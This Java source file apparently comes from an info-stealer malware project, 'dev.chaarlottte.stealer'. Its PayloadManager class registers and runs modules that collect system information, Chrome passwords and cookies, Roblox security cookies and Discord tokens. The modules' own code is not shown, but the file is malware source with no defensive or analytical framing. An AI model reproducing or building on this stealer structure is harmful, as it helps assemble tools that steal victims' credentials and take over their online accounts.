package dev.chaarlottte.stealer.payload;

import dev.chaarlottte.stealer.payload.impl.*;
import dev.chaarlottte.stealer.util.*;

import java.util.ArrayList;
import java.util.List;

public class PayloadManager {

    public List<Payload> payloads;

    public PayloadManager() {
        payloads = new ArrayList<>();
        payloads.add(new ComputerInfo());
        payloads.add(new ChromePasswords());
        payloads.add(new ChromeCookies());
        payloads.add(new RoblosecurityStealer());
        payloads.add(new DiscordTokens());
    }

    public void executePayloads() throws Exception {
        for(Payload payload : payloads) {
            payload.execute();
        }
    }

}
